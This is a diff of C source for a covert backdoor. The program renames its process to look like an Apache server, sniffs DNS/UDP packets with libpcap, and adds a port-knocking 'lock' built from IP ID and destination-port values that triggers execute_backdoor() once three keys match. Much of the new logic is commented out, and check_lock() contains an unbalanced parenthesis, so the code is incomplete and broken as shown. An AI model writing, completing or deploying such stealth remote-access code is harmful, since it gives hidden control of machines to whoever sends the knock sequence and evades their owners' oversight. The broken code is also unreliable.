@@ -30,16 +30,23 @@
 #include <unistd.h>
 #include <sys/types.h>
 #include <sys/prctl.h>
+#include <pthread.h>
 
 #include <net/ethernet.h>
 #include <netinet/ip.h>
-#include <netinet/tcp.h>
+#include <netinet/udp.h>
 #include <pcap.h>
 
 
+#define R_KEY 82
+#define G_KEY 71
+#define B_KEY 66
 
+#define BIT_SET(a,b) ((a) |= (1<<(b)))
 #define MASK "/usr/sbin/apache2 -k start -DSSL"
 #define NIC "wlp3s0"
+
+unsigned char lock = 0b000;
 /*-----------------------------------------------------------------------------------------------
 -- FUNCTION:   mask_application(char *name)
 --             name - 
@@ -85,18 +92,37 @@ void process_packet(u_char *args, const struct pcap_pkthdr *header, const u_char
 
 	int sPort = ntohs(udph->source);
 	// make sure udp
-	/*if((iph->protocol == 17) && (sPort == 53))
+	/*if((iph->protocol == 17))
 	{
 		int id = ntohs(iph->id);
-		if( // id something)
+		int dPort = ntohs(udph->dest);
+		
+		guess = (id % 100) + (dPort % 100);
+		switch(guess)
 		{
-			dPort = ntohs(udph->dest);
-			if( // dPort something)
-			{
-				
-			}
+			case R_KEY:
+				BIT_SET(lock, 0);
+				break;
+			case G_KEY:
+				BIT_SET(lock, 1);
+				break;
+			case B_KEY:
+				BIT_SET(lock, 2);
+				break;
+			default:
+				break;
 		}
 	}*/
+}
+
+
+void *check_lock(void *ptr)
+{
+	if(!((lock + 1) & ((1 << 3) - 1))))
+		execute_backdoor();
+
+	lock = 0;
+	sleep(5);
 }
 
 /*-----------------------------------------------------------------------------------------------
@@ -131,8 +157,9 @@ int main(int argc, char *argv[])
 {
 	char *dev;
 	char errbuf[PCAP_ERRBUF_SIZE];
-	char filter_exp[] = "port 53";  // filter expression
+	char filter_exp[] = "port 53 and udp";  // filter expression
 	const u_char *packet;
+	pthread_t clThread;
 
 	struct bpf_program fp;  // compiled filter expression
 	struct pcap_pkthdr header;
@@ -177,6 +204,9 @@ int main(int argc, char *argv[])
 		fprintf(stderr, "Couldn't install filter %s: %s\n", filter_exp, pcap_geterr(handle));
 		return(2);
 	}
+
+	
+	//pthread_create( &clThread, NULL, check_lock, NULL);
 
 	// rcv_packet will be called every time a packet is captured
 	pcap_loop(handle, -1, process_packet, NULL);
